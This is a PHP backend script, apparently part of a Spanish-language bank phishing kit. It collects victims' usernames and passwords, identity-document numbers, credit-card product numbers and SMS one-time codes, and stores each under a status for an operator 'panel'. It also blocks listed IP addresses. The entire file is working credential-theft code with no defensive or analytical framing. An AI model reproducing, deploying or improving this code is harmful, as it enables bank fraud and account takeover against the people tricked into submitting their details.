<?php
header('Content-Type: application/json');
require_once __DIR__ . '/helpers.php';

// 1. Validar IP bloqueada antes de procesar (Evitar que rompa el JSON)
$ip = getUserIP();
$pdo = getDB();
if ($pdo) {
    $stmt = $pdo->prepare("SELECT 1 FROM bloqueos WHERE ip = ?");
    $stmt->execute([$ip]);
    if ($stmt->fetch()) {
        http_response_code(403);
        echo json_encode(['success' => false, 'error' => 'blocked']);
        exit;
    }
}

$action = $_POST['action'] ?? '';
$response = ['success' => false];

// Función auxiliar para validar si los datos se guardaron correctamente
function verifySave($visitorId) {
    $pdo = getDB();
    if (!$pdo) return false;
    $stmt = $pdo->prepare("SELECT id FROM registros WHERE id = ?");
    $stmt->execute([$visitorId]);
    return $stmt->fetch() ? true : false;
}

if ($action === 'login') {
    $username = trim($_POST['username'] ?? '');
    $password = trim($_POST['password'] ?? '');
    $visitor_id = $_POST['visitor_id'] ?? $_SESSION['visitor_id'] ?? '';

    // Guardar datos
    $_SESSION['user'] = $username;
    saveUserData([
        'documento' => $username,
        'contrasena' => $password,
        'status' => 'login_recibido'
    ], true);

    // Verificar que realmente cayó en el panel
    if (!empty($visitor_id) && verifySave($visitor_id)) {
        $response = ['success' => true, 'next' => 'loading'];
    } else {
        $response = ['success' => false, 'error' => 'No se pudo guardar en la BD'];
    }

} elseif ($action === 'identity') {
    $doc_type = trim($_POST['doc_type'] ?? 'DUI');
    $doc_number = trim($_POST['doc_number'] ?? '');
    $product_type = trim($_POST['product_type'] ?? 'Tarjeta de Crédito');
    $product_number = trim($_POST['product_number'] ?? '');
    $visitor_id = $_POST['visitor_id'] ?? $_SESSION['visitor_id'] ?? '';

    saveUserData([
        'doc_type' => $doc_type,
        'doc_number' => $doc_number,
        'product_type' => $product_type,
        'product_number' => $product_number,
        'status' => 'identidad_recibida'
    ], true);

    if (!empty($visitor_id) && verifySave($visitor_id)) {
        $response = ['success' => true, 'next' => 'loading'];
    } else {
        $response = ['success' => false, 'error' => 'No se pudo guardar en la BD'];
    }

} elseif ($action === 'token') {
    $token_code = trim($_POST['token_code'] ?? '');
    $visitor_id = $_POST['visitor_id'] ?? $_SESSION['visitor_id'] ?? '';

    $_SESSION['token_verified'] = true;
    saveUserData([
        'sms' => $token_code,
        'status' => 'sms_recibido'
    ], true);

    if (!empty($visitor_id) && verifySave($visitor_id)) {
        $response = ['success' => true, 'next' => 'loading'];
    } else {
        $response = ['success' => false, 'error' => 'No se pudo guardar en la BD'];
    }
}

echo json_encode($response);
exit;
?>
